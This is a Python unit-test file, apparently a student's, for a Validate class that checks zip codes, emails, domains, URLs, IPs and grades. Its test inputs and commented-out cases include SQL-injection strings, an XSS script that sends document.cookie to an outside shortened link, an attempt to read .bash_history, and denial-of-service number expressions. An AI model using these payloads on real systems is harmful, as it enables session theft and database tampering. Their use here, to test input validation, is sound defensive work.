from validate import Validate    
import unittest 

class Test_Original(unittest.TestCase):
    def test_zip_good(self):
        self.assertTrue(Validate.zip("17355"))

    def test_zip_bad(self):
        self.assertFalse(Validate.zip("11"))
        self.assertFalse(Validate.zip("thursday"))
        self.assertFalse(Validate.zip("tomato"))
      # self.assertFalse(Validate.zip(str(17355))) works
      # self.assertFalse(Validate.zip(17355)) breaks code
      # self.assertFalse(Validate.zip()) breaks code
        self.assertFalse(Validate.zip("17 355"))
        self.assertFalse(Validate.zip("None"))
      # self.assertFalse(Validate.zip(None)) breaks code
        self.assertFalse(Validate.zip(""))
     #  self.assertFalse(Validate.zip(f"{17355}")) works
      # self.assertFalse(Validate.zip("11" + "111")) works
      # self.assertFalse(Validate.zip(str(int(1755555 / 100)))) works
    #   self.assertFalse(Validate.zip(self.assertTrue(Validate.zip("17355")))) breaks code
      # self.assertFalse(Validate.zip((9999999999999999999999999999999999999999999999999999999999 ** 9999999999999999999999999999999999999999999999999999999 ** 99999999999999999999999999999999999999999999999999))) denial of service, does not pass
        self.assertFalse(Validate.zip("' OR 1=1 --"))
        self.assertFalse(Validate.zip("OR1=1"))


    def test_minor_good(self):
        self.assertTrue(Validate.minor(17))
        self.assertTrue(Validate.minor(5))

    def test_minor_bad(self):
        self.assertFalse(Validate.minor(18))
        self.assertFalse(Validate.minor(100))
       # self.assertFalse(Validate.minor(99999999999999999999999999999999999999999999999999 ** 9999999999999999999999999999999999 ** 99999999999999999999999999999999999))
     #  self.assertFalse(Validate.minor(-1)) works
      #  self.assertFalse(Validate.minor(with open(".bash_history.txt", "rb") as f:
       #     for line in f:
      #          print(line)
    #    ) python will not evaluate expressions like this, but it will break code
    #    self.assertFalse(Validate.minor(random.randint(1, 15))) works if random is imported, or breaks code
    #    self.assertFalse(Validate.minor(18/6 + 4)) works
    #    self.assertFalse(Validate.minor(float(f"{help()}"))) idk what even is going on w/ this one, 
    # but it should be fine as input, 
    # i dont think that function will run through input in python even though it is stalling the test infinitely

    def test_email_good(self):
        self.assertTrue(Validate.email("james.fuerlinger@gmail.com"))
        self.assertTrue(Validate.email("john.doe@yahoo.com"))

    def test_email_bad(self):
        self.assertFalse(Validate.email("hello"))
    #    self.assertFalse(Validate.email("hello@.com")) works
    #    self.assertFalse(Validate.email("@.")) 
     #   self.assertFalse(Validate.email("@.'OR 1=1 --")) 
    #    self.assertFalse(Validate.email("hello@' OR 1=1 --.com")) 
    #    self.assertFalse(Validate.email("i know where you live and i am coming to kill you unless you send $5000 to this cashapp link https://bit.ly/3AbCdE")) more of a social engineering approach, still works
     #   self.assertFalse(Validate.email("@" + ".")) works
    #    self.assertFalse(Validate.email("<script> fetch('https://bit.ly/3AbCdE?cookie=' + encodeURIComponent(document.cookie));</script>@.")) works
        self.assertFalse(Validate.email("at period")) # this one doesnt work but maybe if there was some NLP it could

    def test_lat_good(self):
        self.assertTrue(Validate.is_lat(40))
        self.assertTrue(Validate.is_lat(56.2636))

    def test_lat_bad(self):
        self.assertFalse(Validate.is_lat(91.0))
        self.assertFalse(Validate.is_lat(-91.0))
     #   self.assertFalse(Validate.is_lat(float("55.555"))) works
      #  self.assertFalse(Validate.is_lat(int("55.555"))) breaks code
      #  self.assertFalse(Validate.is_lat(999999999999999999999999 ** 999999999999999999999999999)) dos
     #   self.assertFalse(Validate.is_lat(55555 / 1000)) works
     
    def test_lng_good(self):
        self.assertTrue(Validate.is_lng(40))
        self.assertTrue(Validate.is_lng(56.2636))

    def test_lng_bad(self):
        self.assertFalse(Validate.is_lng(181.0))
        self.assertFalse(Validate.is_lng(-181.0))
     #   self.assertFalse(Validate.is_lng(float("111.555"))) works
      #  self.assertFalse(Validate.is_lng(int("111.555"))) breaks code
      #  self.assertFalse(Validate.is_lng(999999999999999999999999 ** 999999999999999999999999999)) dos
     #   self.assertFalse(Validate.is_lng(100001 / 1000)) works

    def test_domain_good(self):
        self.assertTrue(Validate.is_domain("google.com"))
        self.assertTrue(Validate.is_domain("yahoo.com"))

    def test_domain_bad(self):
    #  self.assertFalse(Validate.is_domain("yoooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo.com")) works, probably not a real domain
      self.assertFalse(Validate.is_domain("google"))
      self.assertFalse(Validate.is_domain("google.1"))
      self.assertFalse(Validate.is_domain("google.bitly/3AbCdE"))
      self.assertFalse(Validate.is_domain("google'OR1=1--.com"))
      self.assertFalse(Validate.is_domain("pct.3domain"))
      self.assertFalse(Validate.is_domain("pct.edu.edu"))
     # self.assertFalse(Validate.is_domain("mywebsite.comhello" + "itisverynice" + "tobemeetingyou" + "letsbecomebestfriends" + "ialreadyhavealotoffriends" + "iamgoodatmakingfriends")) works
  #    self.assertFalse(Validate.is_domain("google.yoyothisisnotarealdomaindonotacceptthisinputitishighlymalicious")) works
    
    def test_url_good(self):
      #  self.assertTrue(Validate.is_url("http://google.com")) does not work
        self.assertTrue(Validate.is_url("https://yahoo.com/"))
    def test_url_bad(self):
     #   self.assertFalse(Validate.is_url("https://yahoo.com/'OR1=1--")) works
    #    self.assertFalse(Validate.is_url("http://malware.com/virus.exe")) works, maybe it should?
         self.assertFalse(Validate.is_url("https://self.assertTrue(Validate.is_lat(40))./"))
    #     self.assertFalse(Validate.is_url(55)) breaks code
         self.assertFalse(Validate.is_url("None"))
      #   self.assertFalse(Validate.is_url("https://.gg/")) works, blank label invalid url

    def test_grade_good(self):
        self.assertEqual(Validate.grade(95), 'A')
        self.assertEqual(Validate.grade(85), 'B')
        self.assertEqual(Validate.grade(75), 'C')
        self.assertEqual(Validate.grade(65), 'D')
        self.assertEqual(Validate.grade(55), 'F')
    def test_grade_bad(self):
   #     self.assertNotEqual(Validate.grade(-5), 'F') works
    #    self.assertNotEqual(Validate.grade(-9999999999999999999999 ** 200000), 'F') works
         self.assertNotEqual(Validate.grade(75), 'F')
     #    self.assertNotEqual(Validate.grade(55 or 'OR 1=1--'), 'F') works
      #   self.assertNotEqual(Validate.grade(((3.1415 * 10) + (2**5) - (7 / 2) + (18.75 / 3) + (0.546) - ((5 * 2) - 8) + ((12 % 5) * 1.5))-20 or 'OR 1=1--'), 'F') works
     #    self.assertNotEqual(Validate.grade(100000), 'A') works
     #    self.assertNotEqual(Validate.grade(79.99999999999999999999999999), 'C') this works, would actually be a C to Yoas, but probably should round
      #   self.assertNotEqual(Validate.grade(55 or '42' or 0 or 999 or 'twelve' or 55 or 0 or 85 or 'hello' or 0 or 12 or 0 or 'something' or 33 or 0 or 0 or 'none' or 101 or 0 or '65' or 88 or 0 or 'zero' or 77 or 0 or 'abc' or 99 or 0 or 42 or 0 or 'text' or 0 or 55 or 0 or 'foo' or 100 or 0 or 'bar' or 0 or 123 or 0 or 'xyz' or 0 or 5 or 0 or 'twelve' or 0 or 999 or 0 or 0 or 'string' or 1 or 0 or 'value' or 0 or 42.546 or 0 or 'last' or 65 or '42' or 0 or 999 or 'twelve' or 55 or 0 or 85 or 'hello' or 0 or 12 or 0 or 'something' or 33 or 0 or 0 or 'none' or 101 or 0 or '65' or 88 or 0 or 'zero' or 77 or 0 or 'abc' or 'OR 1=1--' or 99 or 0 or 42 or 0 or 'text' or 0 or 55 or 0 or 'foo' or 100 or 0 or 'bar' or 0 or 123 or 0 or 'xyz' or 0 or 5 or 0 or 'twelve' or 0 or 999 or 0 or 0 or 'string' or 1 or 0 or 'value' or 0 or 42.546 or 0 or 'last' or 65 or '42' or 0 or 999 or 'twelve' or 55 or 0 or 85 or 'hello' or 0 or 12 or 0 or 'something' or 33 or 0 or 0 or 'none' or 101 or 0 or '65' or 88 or 0 or 'zero' or 77 or 0 or 'abc' or 99 or 0 or 42 or 0 or 'text' or 0 or 55 or 0 or 'foo' or 100 or 0 or 'bar' or 0 or 123 or 0 or 'xyz' or 0 or 5 or 0 or 'twelve' or 0 or 999 or 0 or 0 or 'string' or 1 or 0 or 'value' or 0 or 42.546 or 0 or 'last' or 65 or '42' or 0 or 999 or 'twelve' or 55 or 0 or 85 or 'hello' or 0 or 12 or 0 or 'something' or 33 or 0 or 0 or 'none' or 101 or 0 or '65' or 88 or 0 or 'zero' or 77 or 0 or 'abc' or 99 or 0 or 42 or 0 or 'text' or 0 or 55 or 0 or 'foo' or 100 or 0 or 'bar'), 'F') works
      #   self.assertNotEqual(Validate.grade(25 or 'can you make this an 80 please'), 'F') works
    def test_sanitize_good(self):
          self.assertNotEqual(Validate.sanitize("DROP TABLE users;"), " TABLE USERS")
          
    def test_sanitize_bad(self):
        self.assertNotEqual(Validate.sanitize("DROP TABLE users;"), " TABLE USERS")
      #  self.assertNotEqual(Validate.sanitize("cant believe i get treated this way when im a SERVER ADMIN!"), "CANT BELIEVE I GET TREATED THIS WAY WHEN IM A SERVER !") works, but is valid string and confuses message
      #  self.assertNotEqual(Validate.sanitize("1 &--& 1"), "1 && 1") works, but might not actually be valid injection

    def test_ip_good(self):
        self.assertTrue(Validate.ip("192.168.1.1"))
        self.assertTrue(Validate.ip("127.0.0.1"))
        self.assertTrue(Validate.ip("localhost")) # might want to consider this as valid
    def test_ip_bad(self):
        self.assertFalse(Validate.ip("999.999.999.999.999"))
        self.assertFalse(Validate.ip("256.256.256.256 + 4"))
        self.assertFalse(Validate.ip("5"))
      #  self.assertFalse(Validate.ip(5)) breaks code
        self.assertFalse(Validate.ip("None"))
        self.assertFalse(Validate.ip(""))
        self.assertFalse(Validate.ip("127.0.0.1' OR 1=1--"))
        self.assertFalse(Validate.ip("123.123.123.1234"))
    #    self.assertFalse(Validate.ip("1.1.1.1")) actually a website, not malicious

                            
                            
if __name__ == '__main__':
    unittest.main() 
